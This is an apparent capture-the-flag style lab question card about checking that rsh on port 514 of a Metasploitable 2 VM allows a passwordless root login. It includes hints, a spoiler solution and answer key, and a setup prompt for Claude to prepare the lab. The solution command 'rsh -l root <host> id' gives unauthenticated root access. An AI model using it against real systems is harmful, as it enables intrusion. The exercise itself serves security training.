# Q040 — R-Services rsh Probe

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 03 — Enumeration |
| **Difficulty** | 🟡 Medium |
| **Tools** | `rsh-client` |
| **Time budget** | 10–15 min |

---

## 📝 Question

Confirm rsh (port 514) is open on Metasploitable. Use `rsh -l root 192.168.52.129 id` and report the result.

---

## 🎯 Flag Format

```
rsh=<success|fail>
```

Example: `rsh=success`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Metasploitable has rsh-server with `+ +` in /root/.rhosts.
</details>

<details>
<summary>Hint 2</summary>

If `rsh` not installed: `sudo apt install rsh-client`.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
rsh -l root 192.168.52.129 id
```

Returns `uid=0(root) gid=0(root)` — full root with no password.

**Answer:** `rsh=success`

📖 Ref: [playbooks/enumeration-playbook.md](../../playbooks/enumeration-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q040:
1. Verify Metasploitable2 (192.168.52.129) up; r-services (xinetd-managed) running: ssh msfadmin@192.168.52.129 → sudo service xinetd status.
2. /root/.rhosts on Metasploitable2 contains '+ +' by default → passwordless rsh as root.
3. From Parrot: nmap -p 512,513,514 192.168.52.129 — all open. Install rsh client: sudo apt install rsh-client.

Report back: "Lab ready for Q040 — rsh 514 open on 192.168.52.129, /root/.rhosts=+ +".
```
